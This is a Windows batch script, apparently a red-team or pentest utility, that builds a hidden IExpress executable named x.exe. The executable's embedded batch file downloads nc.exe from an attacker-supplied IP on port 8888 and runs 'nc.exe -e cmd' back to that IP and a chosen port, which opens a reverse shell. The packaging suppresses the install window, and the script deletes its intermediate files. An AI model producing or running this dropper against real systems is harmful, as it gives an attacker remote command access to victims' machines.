@echo off
setlocal enabledelayedexpansion
if "%1"=="" goto err
if "%2"=="" goto err
set "i=%1"
set "p=%2"
set "t=%~dp0x.exe"
set "b=%~dp0x.bat"
set "n=x.bat"
set "d=%~dp0"
> "%b%" echo @echo off
>> "%b%" echo powershell -c "Get-Process x -ErrorAction SilentlyContinue | Stop-Process -Force"
>> "%b%" echo powershell -c "if (-Not (Test-Path %d%nc.exe)) { C:\Windows\System32\curl %i%:8888/windows/nc.exe -o %d%nc.exe }"
>> "%b%" echo powershell -c "if (-Not (Test-Path %d%nc.exe)) { powershell -c iwr -Uri %i%:8888/windows/nc.exe -OutFile %d%nc.exe }"
>> "%b%" echo start /b cmd /c %d%nc.exe -e cmd %i% %p%
>> "%b%" echo PAUSE
>> "%b%" echo exit
(
echo [Version]
echo Class=IEXPRESS
echo SEDVersion=3
echo [Options]
echo PackagePurpose=InstallApp
echo ShowInstallProgramWindow=0
echo HideExtractAnimation=1
echo UseLongFileName=1
echo InsideCompressed=0
echo CAB_FixedSize=0
echo CAB_ResvCodeSigning=0
echo RebootMode=N
echo InstallPrompt=
echo DisplayLicense=
echo FinishMessage=
echo TargetName=!t!
echo FriendlyName=w
echo AppLaunched=cmd /c !n!
echo PostInstallCmd=^<None^>
echo AdminQuietInstCmd=
echo UserQuietInstCmd=
echo SourceFiles=SourceFiles
echo [SourceFiles]
echo SourceFiles0=!d!
echo [SourceFiles0]
echo !n!=
) > "%~dp02.sed"
iexpress /n /q /m %~dp02.sed
del /f %~dp0x.bat %~dp02.sed
goto :eof

:err
echo -------------------------------------------
echo    Usage: .\bat2exe.bat 10.10.10.10 4444
echo -------------------------------------------
exit /b 1
